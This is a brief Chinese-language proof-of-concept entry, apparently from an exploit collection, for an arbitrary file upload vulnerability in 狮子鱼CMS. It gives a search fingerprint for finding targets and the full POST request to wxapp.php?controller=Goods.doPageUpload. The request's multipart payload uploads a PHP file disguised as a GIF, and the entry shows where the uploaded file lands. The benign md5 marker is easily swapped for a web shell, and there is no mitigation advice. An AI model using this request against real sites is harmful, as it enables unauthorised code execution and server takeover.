# 狮子鱼CMSdoPageUpload存在任意文件上传漏洞

- **系统**：狮子鱼　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="狮子鱼CMS"`
- **请求**：`POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWA…`　`Content-Length: 201`

**请求体 / payload**
```
------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="upfile"; filename="test.php"
Content-Type: image/gif
<?php echo md5(1);?>
------WebKitFormBoundary8UaANmWAgM4BqBSs--

文件上传位置
/Uploads//image//goods//2024-04-17//2031104173844146.php
```

**其他**
- 狮子鱼CMS doPageUpload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 狮子鱼CMS